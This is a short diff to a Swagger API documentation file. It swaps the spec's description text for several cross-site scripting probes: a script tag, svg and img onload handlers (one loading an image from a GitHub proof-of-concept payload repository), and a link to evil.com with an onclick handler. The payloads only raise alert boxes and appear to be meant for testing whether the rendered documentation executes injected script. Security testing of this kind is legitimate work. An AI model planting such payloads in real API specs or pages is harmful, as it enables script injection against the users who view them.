@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description:  <marquee>Este texto vai "rolar" da direita para esquerda</marquee>
+  description:  <script>alert(1)</script>
  <svg onload=confirm(1)> <img src='https://raw.githubusercontent.com/Cosmess/pocs_payloads/main/poc_cosmess.png' onload='alert(1)'> <a href='https://evil.com' onclick='alert(1)'>> CLICK HERE</a >
   version: production
 basePath: /JSSResource/
